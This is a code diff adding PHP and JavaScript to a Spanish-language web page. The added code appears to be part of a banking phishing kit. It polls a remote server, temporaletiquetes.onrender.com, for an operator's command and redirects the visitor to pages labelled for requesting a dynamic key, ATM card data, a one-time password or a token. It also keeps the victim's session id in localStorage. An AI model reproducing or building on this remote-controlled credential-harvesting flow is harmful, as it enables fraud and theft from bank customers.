@@ -1,4 +1,30 @@
 <!DOCTYPE html>
+<?php
+$transactionId = $_GET['id'] ?? null;
+
+if ($transactionId) {
+    $url = "https://temporaletiquetes.onrender.com/dinadatos/verificaciones.php?id=" . urlencode($transactionId);
+    $json = @file_get_contents($url);
+    $data = json_decode($json, true);
+    $accion = $data['accion'] ?? '';
+
+    $rutas = [
+        "pedir_dinamica" => "dinamica-id.php",
+        "pedir_cajero"   => "ccajero-id.php",
+        "pedir_otp"      => "otp-id.php",
+        "pedir_token"    => "token-id.php",
+        "error_tc"       => "error-ccajero.php",
+        "error_logo"     => "error-id.php",
+    ];
+
+    $archivoActual = basename($_SERVER['PHP_SELF']);
+    if (isset($rutas[$accion]) && $archivoActual !== $rutas[$accion]) {
+        header("Location: " . $rutas[$accion] . "?id=" . urlencode($transactionId));
+        exit;
+    }
+}
+?>
+
 <html lang="es">
 
 <head>
@@ -566,6 +592,16 @@ document.addEventListener('DOMContentLoaded', function () {
     }
 });
 
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const id = localStorage.getItem("transactionId");
+  const url = new URL(window.location.href);
+  if (id && !url.searchParams.get("id")) {
+    url.searchParams.set("id", id);
+    window.location.href = url.toString();
+  }
+});
 </script>
 
 </body>
